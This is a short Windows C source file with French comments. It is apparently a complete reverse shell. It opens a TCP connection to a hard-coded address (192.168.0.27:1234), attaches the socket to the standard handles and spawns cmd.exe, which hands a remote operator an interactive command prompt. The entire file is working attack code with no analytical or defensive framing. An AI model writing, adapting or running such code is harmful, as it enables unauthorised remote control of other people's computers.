//A compiler avec le flag : -lws2_32

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
//#define _WIN32_WINNT 0x0500
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")


// Informations du serveur
#define PORT 1234
#define SERVER "192.168.0.27"

int main(void){

    WSADATA wsaData;
    SOCKET si;
    struct sockaddr_in hax;
    STARTUPINFO sui;
    PROCESS_INFORMATION pi;

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    si=WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    hax.sin_family=AF_INET;
    hax.sin_port=htons(PORT);

    hax.sin_addr.s_addr=inet_addr(SERVER);

    if( WSAConnect(si, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL)!=0 )
    {
        printf("%d\n", WSAGetLastError());
        getchar();
        exit(-1);
    }

    memset(&sui, 0, sizeof(sui));
    sui.cb=sizeof(sui);
    sui.dwFlags=(STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    sui.hStdInput=sui.hStdOutput=sui.hStdError=(HANDLE)si;

    char *cmdline="cmd.exe";
    CreateProcess(NULL, cmdline, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
	
	return 0;

}
